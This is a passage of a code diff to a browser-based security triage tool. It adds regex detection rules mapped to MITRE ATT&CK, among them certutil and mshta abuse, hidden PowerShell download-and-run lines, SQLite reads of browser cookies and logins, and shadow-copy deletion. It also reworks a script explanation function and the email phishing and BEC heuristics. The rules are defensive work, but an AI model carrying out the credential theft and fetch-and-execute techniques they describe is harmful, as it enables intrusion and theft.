+      { pattern:/sqlite3.*(?:Cookies|Login Data|Web Data)/gi,                   sev:"critical", label:"Browser credential/cookie theft via SQLite",                        mitre:["T1539","T1555.003"] },
+      { pattern:/appdata.*(?:Roaming|Local).*(?:Discord|Chrome|Firefox|Edge)/gi, sev:"critical", label:"Browser/app data theft (Discord token, Chrome cookies, etc.)",   mitre:["T1539","T1555"] },
+    ],
+    auto: [
+      // ── LOLBins / Living off the Land ──────────────────────────
+      { pattern:/\bcertutil\b.*(?:-decode|-urlcache|-encode)/gi,                sev:"critical", label:"CertUtil LOLBin — download/decode abuse",                          mitre:["T1105","T1140","T1218.003"] },
+      { pattern:/\bregsvr32\b.*(?:\/s|scrobj|http)/gi,                          sev:"critical", label:"Regsvr32 LOLBin — code execution via COM scriptlet",               mitre:["T1218.010"] },
+      { pattern:/\bmshta\b/gi,                                                  sev:"critical", label:"MSHTA LOLBin — executes HTA/VBScript/JScript",                     mitre:["T1218.005"] },
+      { pattern:/\bwmic\b.*process.*call.*create/gi,                            sev:"critical", label:"WMIC process creation — command execution",                         mitre:["T1047"] },
+      { pattern:/\brunscripthelper\b|\bpcalua\b/gi,                             sev:"critical", label:"Undocumented LOLBin execution",                                     mitre:["T1218"] },
+      { pattern:/\brundll32\b.*(?:javascript:|vbscript:|shell32)/gi,            sev:"critical", label:"Rundll32 LOLBin — code execution via DLL",                          mitre:["T1218.011"] },
+      // ── 2024-2025: ClickFix attacks ───────────────────────────
+      { pattern:/(?:Win|RunDLL|Ctrl\+V).*(?:CAPTCHA|verify|human|robot)/gi,    sev:"critical", label:"ClickFix lure — fake CAPTCHA asking user to run a command",        mitre:["T1204.002","T1059"] },
+      { pattern:/powershell.*-w.*hidden.*-c.*(?:irm|iex|curl|wget)/gi,         sev:"critical", label:"ClickFix payload — hidden PS execution pattern",                   mitre:["T1059.001","T1204.002"] },
+      // ── 2024-2025: AiTM / session theft ──────────────────────
+      { pattern:/evilginx|modlishka|muraena|reversed.*proxy/gi,                sev:"critical", label:"AiTM phishing framework detected",                                  mitre:["T1111","T1557.002"] },
+      { pattern:/steal.*(?:cookie|session|token)|cookie.*(?:steal|grab|harvest)/gi, sev:"critical", label:"Session/cookie theft intent",                                 mitre:["T1539","T1185"] },
+      // ── 2024: QR code / TOAD patterns ────────────────────────
+      { pattern:/qr(?:code)?.*(?:scan|link|http)|bit\.ly|tinyurl.*qr/gi,       sev:"high",     label:"QR code URL — possible QRishing delivery",                          mitre:["T1566.002"] },
+      // ── Universal indicators ──────────────────────────────────
+      { pattern:/https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/gi,            sev:"critical", label:"HTTP to raw IP address — suspicious C2 endpoint",                   mitre:["T1071.001","T1102"] },
+      { pattern:/https?:\/\/[a-z0-9-]{8,}\.(xyz|top|click|gq|cf|tk|pw|cc|su|ru)\b/gi, sev:"high", label:"High-risk TLD domain — common in phishing/malware infrastructure", mitre:["T1566.002","T1071.001"] },
+      { pattern:/(?:4444|1234|8888|9999|31337|50050|4447|55555)\b/gi,          sev:"high",     label:"Common C2/backdoor port number",                                     mitre:["T1071","T1090"] },
+      { pattern:/\bPEHeader\b|MZ\x90\x00|\x4d\x5a/gi,                          sev:"critical", label:"PE/executable header in script — embedded binary payload",           mitre:["T1027.009"] },
+      { pattern:/(?:taskkill|pkill|killall).*(?:defender|av|antivirus|malware)/gi, sev:"critical", label:"AV/security tool termination",                                  mitre:["T1562.001"] },
+      { pattern:/vssadmin.*delete.*shadows|wbadmin.*delete/gi,                 sev:"critical", label:"Shadow copy deletion — ransomware pre-encryption step",             mitre:["T1490"] },
+      // ── Macro / Office VBA ─────────────────────────────────────
+      { pattern:/\bAutoOpen\b|\bDocument_Open\b|\bWorkbook_Open\b|\bAuto_Open\b/gi, sev:"critical", label:"Auto-execution macro — runs on document open",              mitre:["T1137.001","T1059.005"] },
+      { pattern:/\bShell\b.*\bCreateObject\b|CreateObject.*Wscript\.Shell/gi,  sev:"critical", label:"VBA Shell execution via WScript",                                   mitre:["T1059.005"] },
+      // ── Browser debugging / session theft (2024) ──────────────
+      { pattern:/\bChrome.*(?:--disable-web-security|--remote-debugging)/gi,   sev:"high",     label:"Browser debugging flag — cookie/session theft setup",               mitre:["T1185","T1539"] },
+    ],
+  };;
 
   function autoDetectMode(text) {
     const t = text.toLowerCase();
@@ -7172,18 +7212,22 @@ Note: external OSINT may not return results for private IPs.</div>`;
       </div>`;
     }
 
-    // ── AI Explanation button ──────────────────────────────────
+    // ── Script Explanation — auto-shown after every analysis ──
     html += `<div class="sa-section" id="sa-explain-section">
-      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
-        <button id="sa-ai-explain-btn" type="button" style="background:linear-gradient(135deg,#7c3aed,#1D9E75);color:#fff;border:none;font-weight:800;padding:8px 18px;border-radius:8px;font-size:11.5px;cursor:pointer;">
-          ⚡ AI Explain — What does this script do?
-        </button>
-        <span style="font-size:11px;color:var(--muted);">Get a plain-English explanation of intent, behavior, and threat level</span>
+      <div id="sa-ai-explanation" style="margin-top:4px;"></div>
+      <div style="margin-top:10px;display:flex;align-items:center;gap:8px;">
+        <button id="sa-ai-explain-btn" type="button" style="background:linear-gradient(135deg,#7c3aed,#1D9E75);color:#fff;border:none;font-weight:700;padding:6px 14px;border-radius:7px;font-size:11px;cursor:pointer;">⚡ Refresh AI Analysis</button>
+        <span style="font-size:10.5px;color:var(--muted);">Get enhanced AI explanation (requires connection)</span>
       </div>
-      <div id="sa-ai-explanation" style="display:none;margin-top:12px;"></div>
     </div>`;
 
     saResults.innerHTML = html;
+
+    // Auto-show offline explanation immediately
+    const saExplainDiv = document.getElementById("sa-ai-explanation");
+    if (saExplainDiv && hits !== undefined) {
+      saExplainDiv.innerHTML = buildScriptExplanation(hits, mitre, iocs, effectiveMode, verdict, entropy, text);
+    }
 
     // Wire up AI explain button
     const saAIBtn = document.getElementById("sa-ai-explain-btn");
@@ -7236,92 +7280,136 @@ Note: external OSINT may not return results for private IPs.</div>`;
     });
   }
 
-  // ── Build rich offline script explanation from indicators ───────
+  // ── Build rich offline script explanation ──────────────────────
   function buildScriptExplanation(hits, mitre, iocs, mode, verdict, entropy, scriptText) {
     const critHits = hits.filter(h => h.sev === "critical");
     const highHits = hits.filter(h => h.sev === "high");
-    const allSev   = [...critHits, ...highHits, ...hits.filter(h=>h.sev==="medium")];
+    const medHits  = hits.filter(h => h.sev === "medium");
+    const allSev   = [...critHits, ...highHits, ...medHits];
+    const labels   = hits.map(h => h.label.toLowerCase()).join(" ");
+    const text_lc  = scriptText.slice(0, 2000).toLowerCase();
 
-    // Intent classification
-    const labels = hits.map(h => h.label.toLowerCase()).join(" ");
-    const hasC2        = /download|invoke-webrequest|webclient|curl|wget|beacon|c2|iex|invoke.expression/i.test(labels + scriptText.slice(0,1000));
-    const hasPersist   = /scheduled.task|registry|startup|autorun|cron|run.key|persist/i.test(labels);
-    const hasPrivesc   = /privilege|elevat|bypass|uac|admin|runas/i.test(labels);
-    const hasRecon     = /whoami|ipconfig|systeminfo|net user|net group|query|enumerat/i.test(labels + scriptText.slice(0,500));
-    const hasExfil     = /upload|post.*http|send|email|smtp|ftp|exfil/i.test(labels);
-    const hasLateral   = /wmi|psexec|invoke.command|remote|smb|rdp|lateral/i.test(labels);
-    const hasObfusc    = /base64|encode|obfuscat|compress|gzip|xor|char\[\]/i.test(labels);
-    const hasCredTheft = /credential|lsass|mimikatz|sekurlsa|logonpassword|sam|ntlm|dump/i.test(labels + scriptText.slice(0,500));
-    const hasDefEvasion= /amsi|defender|av|antivirus|disable|bypass|hidden|unrestrict/i.test(labels);
-    const hasMalDrop   = /dropper|download.*exe|write.*bytes|memorystream|loader|inject/i.test(labels);
-    const hasRansom    = /encrypt|ransom|wallet|bitcoin|shadow.copy|vssadmin/i.test(labels + scriptText.slice(0,500));
+    // ── Behavioral detection ────────────────────────────────────
+    const hasDownload  = /invoke-webrequest|downloadfile|downloadstring|webclient|wget|curl|bitstransfer/i.test(labels + text_lc);
+    const hasExec      = /start-process|invoke-expression|iex|shellexecute|createobject.*wscript|exec|cmd\.exe/i.test(labels + text_lc);
+    const hasPersist   = /scheduled.task|registry.*run|startup|autorun|schtasks|set-itemproperty.*run/i.test(labels + text_lc);
+    const hasDefEvasion= /amsi|set-mppreference|disablerealtimemonitor|bypass|unrestricted|hidden|disableav|av|defender|disable/i.test(labels + text_lc);
+    const hasObfusc    = /base64|frombase64|convert.*base64|-enc\b|-encoded|-e\s+[a-z0-9+/]{20}/i.test(labels + text_lc);
+    const hasC2        = /http[s]?:\/\/\d|invoke-webrequest.*http|downloadstring.*http|beacon|c2|command.*control/i.test(labels + text_lc);
+    const hasPrivesc   = /elevat|privilege|uac.*bypass|runas|admin|token.*impersonat/i.test(labels + text_lc);
+    const hasCredTheft = /lsass|credential|sekurlsa|logonpassword|sam\b|ntlm|mimikatz|comsvcs/i.test(labels + text_lc);
+    const hasExfil     = /invoke-webrequest.*post|\bpost\b.*http|upload|smtp|send-mailmessage|\boutbound\b/i.test(labels + text_lc);
+    const hasLateral   = /invoke-command|enter-pssession|wmi.*remote|psexec|new-pssession/i.test(labels + text_lc);
+    const hasRecon     = /get-process|get-service|get-computer|whoami|ipconfig|systeminfo|net\s+user|get-aduser|get-netcomputer/i.test(labels + text_lc);
+    const hasRansom    = /encrypt|get-childitem.*\$\w|rename-item|vssadmin|shadow|bitcoin|wallet/i.test(labels + text_lc);
+    const hasSelfDel   = /remove-item.*\$myinvocation|del.*%0|self.delet/i.test(labels + text_lc);
+    const hasMemInject = /virtualallocex|writeprocessmemory|createremotethread|reflective|inject/i.test(labels + text_lc);
 
-    // Determine primary purpose
-    const purposes = [];
-    if (hasRansom)    purposes.push("🔴 Ransomware — encrypts files and deletes backups");
-    if (hasMalDrop)   purposes.push("🔴 Malware dropper — downloads and executes a payload");
-    if (hasC2)        purposes.push("🔴 C2 communication — connects to remote attacker infrastructure");
-    if (hasCredTheft) purposes.push("🔴 Credential theft — extracts passwords or authentication tokens");
-    if (hasDefEvasion)purposes.push("🟠 Defense evasion — bypasses antivirus or security monitoring");
-    if (hasObfusc)    purposes.push("🟠 Obfuscation — hides true intent using encoding or encryption");
-    if (hasPersist)   purposes.push("🟡 Persistence — installs mechanisms to survive reboots");
-    if (hasPrivesc)   purposes.push("🟡 Privilege escalation — attempts to gain SYSTEM or admin rights");
-    if (hasLateral)   purposes.push("🟡 Lateral movement — spreads to other systems on the network");
-    if (hasRecon)     purposes.push("🟡 Reconnaissance — collects system and network information");
-    if (hasExfil)     purposes.push("🟡 Exfiltration — sends data out of the network");
-    if (!purposes.length && hits.length > 0) purposes.push("🟡 Suspicious activity — " + allSev.slice(0,2).map(h=>h.label).join(", "));
-    if (!purposes.length) purposes.push("✅ No clear malicious purpose detected in this script");
+    // ── Extract specific IOCs from script ────────────────────────
+    const scriptUrls    = [...new Set((scriptText.match(/https?:\/\/[^\s"'`,;\]]+/gi)||[]).map(u=>u.replace(/['"`,;)\]]+$/,"")))];
+    const scriptIPs     = [...new Set((scriptText.match(/\b(\d{1,3}\.){3}\d{1,3}\b/g)||[]).filter(ip=>!ip.startsWith("127.")&&!ip.startsWith("0.")))];
+    const scriptPaths   = [...new Set((scriptText.match(/[A-Za-z]:\\[^"'\n`]+|\/(?:tmp|var|home|etc)\/[^\s"'`]+/g)||[]))];
+    const scriptRegKeys = [...new Set((scriptText.match(/HKCU:[\\\/]\S+|HKLM:[\\\/]\S+|HKEY_\w+[\\\/]\S+/gi)||[]))];
 
-    // Key behaviors from top indicators
-    const behaviors = allSev.slice(0, 5).map(h => {
-      const matches = h.matches.slice(0,2).map(m => m.slice(0,60)).join(", ");
-      return "• " + h.label + (matches ? " — e.g. " + matches : "");
-    });
+    // ── Determine verdicts ──────────────────────────────────────
+    const isClean   = hits.length === 0 && entropy < 4.5;
+    const isMalicious = critHits.length >= 1;
+    const isSuspicious = !isClean && !isMalicious;
 
-    // IOC summary
-    const iocSummary = [];
-    if ((iocs.urls||[]).length)     iocSummary.push((iocs.urls||[]).length + " URL(s): " + (iocs.urls||[]).slice(0,3).join(", "));
-    if ((iocs.ips||[]).length)      iocSummary.push((iocs.ips||[]).length + " IP(s): " + (iocs.ips||[]).join(", "));
-    if ((iocs.domains||[]).length)  iocSummary.push((iocs.domains||[]).length + " domain(s): " + (iocs.domains||[]).slice(0,3).join(", "));
+    let verdLabel, verdColor, verdIcon, verdSummary;
+    if (isClean) {
+      verdLabel   = "CLEAN — No Threats Detected";
+      verdColor   = "#34d399"; verdIcon = "✅";
+      verdSummary = "No malicious indicators, obfuscation, or suspicious patterns were detected in this script. It appears to be legitimate code.";
+    } else if (isMalicious) {
+      verdLabel   = "MALICIOUS — Confirmed Threat";
+      verdColor   = "#ef4444"; verdIcon = "🚨";
+      verdSummary = `${critHits.length} critical indicator${critHits.length>1?"s":""} confirmed: ${critHits.slice(0,3).map(h=>h.label).join(", ")}.`;
+    } else {
+      verdLabel   = "SUSPICIOUS — Review Required";
+      verdColor   = "#fbbf24"; verdIcon = "⚠️";
+      verdSummary = `${hits.length} warning-level indicator${hits.length>1?"s":""} detected. Manual review required.`;
+    }
+
+    // ── Build step-by-step behavioral timeline ──────────────────
+    const steps = [];
+    if (hasObfusc)    steps.push({ phase:"1. DECEPTION",   icon:"🥷", color:"#a78bfa", text:`Script uses ${scriptText.match(/-enc\b|-encoded\b/i)?"Base64 encoding (-enc flag)":scriptText.match(/[A-Za-z0-9+/]{40,}={0,2}/g)?.length>0?"Base64 encoded payloads":"obfuscation"} to hide its true behavior from security tools.` });
+    if (hasDefEvasion)steps.push({ phase:"2. EVASION",     icon:"🛡", color:"#f87171", text:`Attempts to disable security controls: ${[scriptText.match(/DisableRealtimeMonitoring/i)?"Windows Defender real-time protection":null, scriptText.match(/amsi/i)?"AMSI (AntiMalware Scan Interface)":null].filter(Boolean).join(", ")||"security monitoring"}.` });
+    if (hasRecon)     steps.push({ phase:"3. RECONNAISSANCE",icon:"🔍",color:"#38bdf8", text:`Collects system information: ${[scriptText.match(/whoami/i)?"user identity":null, scriptText.match(/ipconfig|get-netipaddress/i)?"network config":null, scriptText.match(/get-process/i)?"running processes":null, scriptText.match(/systeminfo/i)?"system details":null].filter(Boolean).join(", ")||"host enumeration"}.` });
+    if (hasDownload)  steps.push({ phase:"4. DOWNLOAD",    icon:"📥", color:"#fb923c", text:`Downloads payload from: ${scriptUrls.slice(0,3).join(", ")||scriptIPs.slice(0,3).join(", ")||"remote server"}. ${scriptPaths.length?"Saves to: "+scriptPaths.slice(0,2).join(", "):""}`});
+    if (hasExec)      steps.push({ phase:"5. EXECUTION",   icon:"⚙️", color:"#ef4444", text:`Executes the downloaded or embedded payload${scriptPaths.length?" from "+scriptPaths[0]:""}. ${scriptText.match(/invoke-expression|iex/i)?"Uses IEX (Invoke-Expression) — a common PowerShell execution technique.":""}` });
+    if (hasMemInject) steps.push({ phase:"6. INJECTION",   icon:"💉", color:"#ef4444", text:"Injects code directly into memory of a running process, bypassing file-based AV detection." });
+    if (hasCredTheft) steps.push({ phase:"7. CREDENTIAL THEFT",icon:"🔑",color:"#ef4444",text:`Attempts to steal credentials from ${scriptText.match(/lsass/i)?"LSASS memory (plaintext passwords + hashes)":scriptText.match(/sam\b/i)?"SAM database (local account hashes)":"the target system"}.` });
+    if (hasPersist)   steps.push({ phase:"8. PERSISTENCE", icon:"📌", color:"#fb923c", text:`Installs persistence via: ${[scriptRegKeys.length?"registry Run key ("+scriptRegKeys[0]+")":null, scriptText.match(/schtasks/i)?"scheduled task":null, scriptText.match(/startup/i)?"startup folder":null].filter(Boolean).join(" + ")||"unknown mechanism"}.` });
+    if (hasLateral)   steps.push({ phase:"9. LATERAL MOVEMENT",icon:"🔀",color:"#f87171",text:"Attempts to spread to other systems on the network via WMI, PSRemoting, or PsExec." });
+    if (hasExfil)     steps.push({ phase:"10. EXFILTRATION",icon:"📤",color:"#ef4444",text:`Sends data out via ${scriptText.match(/smtp|send-mailmessage/i)?"email":"HTTP POST or upload"}. Destination: ${scriptUrls.slice(0,2).join(", ")||"remote server"}.` });
+    if (hasRansom)    steps.push({ phase:"11. RANSOMWARE",  icon:"💀", color:"#ef4444", text:"Encrypts files and/or deletes shadow copies to prevent recovery." });
+    if (hasSelfDel)   steps.push({ phase:"12. CLEANUP",    icon:"🧹", color:"#a78bfa", text:"Deletes itself after execution to remove forensic evidence." });
+
+    // ── Recommended actions ──────────────────────────────────────
+    const actions = [];
+    if (isMalicious)  actions.push("Isolate the host immediately — do not allow network access");
+    if (hasC2)        actions.push(`Block C2 destinations at firewall: ${[...scriptUrls,...scriptIPs].slice(0,3).join(", ")||"all outbound from host"}`);
+    if (hasCredTheft) actions.push("Force password reset for ALL accounts that logged into this host");
+    if (hasPersist)   actions.push(`Remove persistence: check ${scriptRegKeys.length?"registry key "+scriptRegKeys[0]+",":""} scheduled tasks, and startup folders`);
+    if (hasDefEvasion)actions.push("Re-enable and update security controls — verify AV/EDR is running");
+    if (hasDownload && scriptPaths.length) actions.push(`Delete downloaded payload: ${scriptPaths[0]}`);
+    if (hasMemInject) actions.push("Memory forensics required — malware may persist only in RAM");
+    if (isClean)      actions.push("No action required. Script appears legitimate.");
+    if (!actions.length) actions.push("Investigate the flagged indicators and correlate with endpoint logs");
+
+    // ── Build HTML output ────────────────────────────────────────
+    const vc = verdColor;
+    let html = `<div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:8px;">
+      <div style="padding:12px 14px;background:${vc}10;border-bottom:1px solid ${vc}30;display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+        <span style="font-size:18px;">${verdIcon}</span>
+        <span style="font-size:13px;font-weight:900;color:${vc};">${esc(verdLabel)}</span>
+        <span style="font-size:10.5px;color:var(--muted);flex:1;">${esc(verdSummary)}</span>
+        ${entropy>5.5?`<span style="font-size:10px;background:rgba(251,191,36,0.15);color:#fbbf24;border:1px solid rgba(251,191,36,0.3);padding:2px 8px;border-radius:8px;">⚠️ Entropy: ${entropy.toFixed(2)}</span>`:""}
+      </div>`;
+
+    // Key IOCs if any
+    if (scriptUrls.length || scriptIPs.length) {
+      html += `<div style="padding:10px 14px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.04);">
+        <div style="font-size:9.5px;font-weight:800;color:#ef4444;text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px;">🎯 Network IOCs Found</div>
+        ${scriptUrls.map(u=>`<div style="font-size:11px;color:#38bdf8;font-family:monospace;margin-bottom:2px;word-break:break-all;">${esc(u)}</div>`).join("")}
+        ${scriptIPs.filter(ip=>!scriptUrls.some(u=>u.includes(ip))).map(ip=>`<div style="font-size:11px;color:#38bdf8;font-family:monospace;margin-bottom:2px;">${esc(ip)}</div>`).join("")}
+      </div>`;
+    }
+
+    // Step-by-step timeline
+    if (steps.length) {
+      html += `<div style="padding:12px 14px;border-bottom:1px solid var(--border);">
+        <div style="font-size:9.5px;font-weight:800;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;">⛓️ Attack Sequence (${steps.length} stage${steps.length>1?"s":""})</div>
+        ${steps.map(s=>`<div style="display:flex;gap:10px;align-items:flex-start;padding:7px 0;border-bottom:1px solid rgba(255,255,255,0.04);">
+          <span style="font-size:14px;flex-shrink:0;">${s.icon}</span>
+          <div>
+            <div style="font-size:9.5px;font-weight:800;color:${s.color};text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px;">${esc(s.phase)}</div>
+            <div style="font-size:11.5px;color:var(--text);line-height:1.65;">${esc(s.text)}</div>
+          </div>
+        </div>`).join("")}
+      </div>`;
+    }
 
     // Recommended actions
-    const actions = [];
-    if (critHits.length)     actions.push("Block and quarantine immediately — " + critHits.length + " critical indicator(s)");
-    if (hasC2)               actions.push("Block the C2 IPs/domains at the firewall: " + [...(iocs.ips||[]), ...(iocs.domains||[])].slice(0,3).join(", "));
-    if (hasCredTheft)        actions.push("Force password reset for all accounts on the affected host");
-    if (hasPersist)          actions.push("Check scheduled tasks, registry Run keys, and startup folders on the affected host");
-    if (hasObfusc)           actions.push("Use Deep Decode to extract the hidden payload, then re-analyze");
-    if (hasMalDrop)          actions.push("Isolate the host immediately — a secondary payload may have been dropped");
-    if (hasDefEvasion)       actions.push("Verify AV/EDR is still running and its definitions are current");
-    if (!actions.length)     actions.push("No immediate containment actions required — continue monitoring");
+    html += `<div style="padding:12px 14px;">
+      <div style="font-size:9.5px;font-weight:800;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;">🔧 Recommended Actions</div>
+      ${actions.map((a,i)=>`<div style="display:flex;gap:8px;padding:4px 0;font-size:11.5px;color:var(--text);">
+        <span style="color:${vc};font-weight:800;flex-shrink:0;">${i+1}.</span>${esc(a)}</div>`).join("")}
+    </div>`;
 
-    // Entropy note
-    const entropyNote = entropy > 6.5 ? "⚠️ Very high entropy (" + entropy.toFixed(2) + ") — strongly indicates encrypted or packed payload inside this script."
-                      : entropy > 5.5 ? "⚠️ Elevated entropy (" + entropy.toFixed(2) + ") — encoded or compressed content detected. Use Deep Decode."
-                      : "";
-
-    const vc = verdict.color || "#9ca3af";
-    return '<div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;">' +
-      '<div style="background:rgba(0,0,0,0.2);padding:10px 14px;display:flex;align-items:center;gap:10px;">' +
-        '<span style="font-size:12px;font-weight:800;color:var(--text);">🔍 Script Analysis — What does this do?</span>' +
-        '<span style="font-size:10px;background:' + vc + '22;color:' + vc + ';border:1px solid ' + vc + '44;padding:2px 10px;border-radius:10px;font-weight:700;">' + esc(verdict.label) + '</span>' +
-        '<span style="font-size:10px;color:var(--muted);">Mode: ' + esc(mode.toUpperCase()) + '</span>' +
-      '</div>' +
-      '<div style="padding:14px;">' +
-        (purposes.length ? '<div style="margin-bottom:12px;"><div style="font-size:10px;font-weight:800;color:var(--muted);text-transform:uppercase;margin-bottom:6px;">Likely Purpose</div>' +
-          purposes.map(p => '<div style="font-size:12px;color:var(--text);padding:3px 0;line-height:1.5;">' + esc(p) + '</div>').join("") + '</div>' : '') +
-        (behaviors.length ? '<div style="margin-bottom:12px;"><div style="font-size:10px;font-weight:800;color:var(--muted);text-transform:uppercase;margin-bottom:6px;">Key Behaviors Detected</div>' +
-          '<div style="font-size:11.5px;color:var(--text);line-height:1.8;">' + behaviors.map(b => esc(b)).join("<br>") + '</div></div>' : '') +
-        (iocSummary.length ? '<div style="margin-bottom:12px;"><div style="font-size:10px;font-weight:800;color:var(--muted);text-transform:uppercase;margin-bottom:6px;">Extracted IOCs</div>' +
-          '<div style="font-size:11.5px;color:#38bdf8;line-height:1.8;">' + iocSummary.map(s => esc(s)).join("<br>") + '</div></div>' : '') +
-        (entropyNote ? '<div style="background:rgba(251,191,36,0.07);border:1px solid rgba(251,191,36,0.2);border-radius:6px;padding:8px 10px;margin-bottom:12px;font-size:11px;color:var(--text);">' + esc(entropyNote) + '</div>' : '') +
-        (actions.length ? '<div><div style="font-size:10px;font-weight:800;color:var(--muted);text-transform:uppercase;margin-bottom:6px;">Recommended Actions</div>' +
-          actions.map((a,i) => '<div style="font-size:11.5px;color:var(--text);padding:3px 0;"><span style="color:#38bdf8;font-weight:700;">' + (i+1) + '.</span> ' + esc(a) + '</div>').join("") + '</div>' : '') +
-        (mitre.length ? '<div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border);font-size:10.5px;color:var(--muted);">MITRE ATT&CK: ' + mitre.slice(0,6).map(t => '<a href="https://attack.mitre.org/techniques/' + t.replace(".","/") + '" target="_blank" style="color:#38bdf8;text-decoration:none;">' + esc(t) + '</a>').join(" · ") + '</div>' : '') +
-      '</div>' +
-    '</div>';
+    // MITRE mapping
+    if (mitre.length) {
+      html += `<div style="padding:8px 14px;border-top:1px solid var(--border);background:rgba(0,0,0,0.1);">
+        <span style="font-size:9.5px;font-weight:800;color:var(--muted);text-transform:uppercase;letter-spacing:.05em;">MITRE ATT&CK: </span>
+        ${mitre.slice(0,8).map(t=>`<a href="https://attack.mitre.org/techniques/${t.replace(".","/")}" target="_blank" style="color:#38bdf8;text-decoration:none;font-size:10px;margin-right:6px;">${esc(t)}</a>`).join("")}
+      </div>`;
+    }
+    html += `</div>`;
+    return html;
   }
 
+  
   function getMitreName(tid) {
     const names = {
       "T1059":    "Command & Scripting Interpreter",
@@ -8566,8 +8654,15 @@ Note: external OSINT may not return results for private IPs.</div>`;
         lookalikeBrand = brand; lookalikeDomain = fromDomain; break;
       }
       // Domain contains brand name with extra chars: paypal-secure.com, amazon-support.net
+      // But NOT if it's a legitimate subdomain like aws.amazon.com, mail.google.com, smtp.microsoft.com
       if (fromDomain && fromDomain.includes(brand) && !new RegExp("^" + brand + "\\.(com|net|org|io|co)$").test(fromDomain)) {
-        lookalikeBrand = brand; lookalikeDomain = fromDomain; break;
+        // Skip if fromDomain ends with .brand.tld (legitimate subdomain)
+        const isLegitSubdomain = new RegExp("\\." + brand + "\\.(com|net|org|io|co|gov|edu|mil|int)$").test(fromDomain);
+        // Skip if DKIM and SPF both pass with the same brand domain
+        const authOK = (dkimDomain || "").includes(brand) && spfResult === "pass" && dkimResult === "pass";
+        if (!isLegitSubdomain && !authOK) {
+          lookalikeBrand = brand; lookalikeDomain = fromDomain; break;
+        }
       }
     }
     // Punycode / homograph / IDN
@@ -8594,18 +8689,28 @@ Note: external OSINT may not return results for private IPs.</div>`;
     const spamSubjectHits = spamSubjectPatterns.filter(p => p.re.test(subject||""));
 
     // ── ATTACK TYPE DETECTION ─────────────────────────────────
-    // BEC signals
+    // BEC signals — require structural indicators, not just subject keywords
+    // Subject keywords alone are NOT sufficient for BEC classification
+    const becSubjectMatch = /ceo|cfo|cto|president|executive|payroll|wire transfer|urgent.*wire|urgent.*transfer/i.test(subject||"");
     const isBEC = !!(
-      (replyEmail && replyEmail !== fromEmail) ||
-      lookalikeBrand ||
-      isPunycode ||
-      /ceo|cfo|cto|president|executive|hr|payroll|wire|transfer|payment|invoice|urgent.*request/i.test(subject||"")
+      // Reply-To hijack is only a BEC signal if ALSO combined with something else
+      // (many legit marketing/ticketing systems use different reply-to)
+      (replyEmail && replyEmail !== fromEmail && replyDomain && fromDomain && replyDomain !== fromDomain && spfResult !== "pass") ||
+      lookalikeBrand ||                              // Brand impersonation (hard signal)
+      isPunycode ||                                  // IDN homograph (hard signal)
+      // Subject BEC keywords only count when combined with auth failures
+      (becSubjectMatch && (spfResult==="fail" || dkimResult==="fail"))
     );
-    // Phishing signals
+    // Phishing signals — require ACTUAL failures (not just absence of auth records)
+    // SPF=none or DKIM=none alone is not phishing — many internal servers lack these
+    const phishSubject = /verify|confirm|suspended|locked|unusual.*activity|sign.?in|login|account.*password|credential|click.*here|update.*info/i.test(subject||"");
     const isPhishing = !!(
+      // Hard auth failures — must be explicit "fail" not just "none"
       (spfResult==="fail" || dkimResult==="fail") ||
-      (spfResult!=="pass" && dmarcResult==="fail") ||
-      /verify|confirm|suspended|locked|unusual.*activity|sign.?in|login|account|password|credential|click.*here|update.*info/i.test(subject||"")
+      // DMARC fail with an explicit SPF fail (not just SPF=none)
+      (spfResult==="fail" && dmarcResult==="fail") ||
+      // Phishing subject keywords PLUS a hard auth failure signal
+      (phishSubject && (spfResult==="fail" || dkimResult==="fail" || lookalikeBrand))
     );
     // Spam signals
     const isSpam = !!(isBulkPrecedence || isBulkHeaders || senderESP || spamSubjectHits.length >= 2);
@@ -8639,7 +8744,11 @@ Note: external OSINT may not return results for private IPs.</div>`;
     else if (isPhishing)     { attackType = "PHISHING";          attackDetail = "Authentication failure + suspicious content pattern"; }
     else if (isSpam)         { attackType = "SPAM / BULK";       attackDetail = senderESP ? `Sent via ${senderESP} ESP` : "Bulk email infrastructure"; }
     else if (spfResult==="pass" && dkimResult==="pass" && dmarcResult==="pass") {
-      attackType = "LIKELY CLEAN";   attackDetail = "All authentication checks pass";
+      attackType = "LIKELY CLEAN";   attackDetail = "All authentication checks pass (SPF + DKIM + DMARC)";
+    } else if (spfResult==="pass" && dkimResult==="pass") {
+      attackType = "LIKELY CLEAN";   attackDetail = "SPF and DKIM pass; DMARC not published but no other threat signals";
+    } else if (spfResult==="pass" && !lookalikeBrand && !isPunycode) {
+      attackType = "LIKELY CLEAN";   attackDetail = "SPF passes with no brand impersonation — likely legitimate";
     } else {
       attackType = "SUSPICIOUS";     attackDetail = "Some signals present — investigate further";
     }
@@ -8761,11 +8870,25 @@ Note: external OSINT may not return results for private IPs.</div>`;
     }
 
     // ── Alignment checks ─────────────────────────────────────
+    const KNOWN_ESPS_ALIGN = ["sendgrid.net","mailchimp.com","mcsv.net","klaviyo.com","constantcontact.com",
+      "hubspot.com","marketo.net","sparkpost.com","amazonses.com","mailgun.org","postmarkapp.com",
+      "exacttarget.com","salesforce.com","google.com","googlemail.com","outlook.com","microsoft.com",
+      "protection.outlook.com","pphosted.com","mimecast.com","proofpoint.com","barracuda.com"];
     if (spfResult==="pass" && spfMailFromDomain && fromDomain && spfMailFromDomain!==fromDomain) {
-      score+=10; flags.push({ sev:"warn", cat:"spoof", msg:`SPF MailFrom domain (${spfMailFromDomain}) ≠ From: domain (${fromDomain}) — display name spoofing possible` });
+      const isESPSpf = KNOWN_ESPS_ALIGN.some(e => spfMailFromDomain.endsWith(e));
+      if (isESPSpf) {
+        flags.push({ sev:"info", cat:"spam", msg:`Sent via ESP (${spfMailFromDomain}) on behalf of ${fromDomain} — expected for platforms like SendGrid, Mailchimp, SES` });
+      } else {
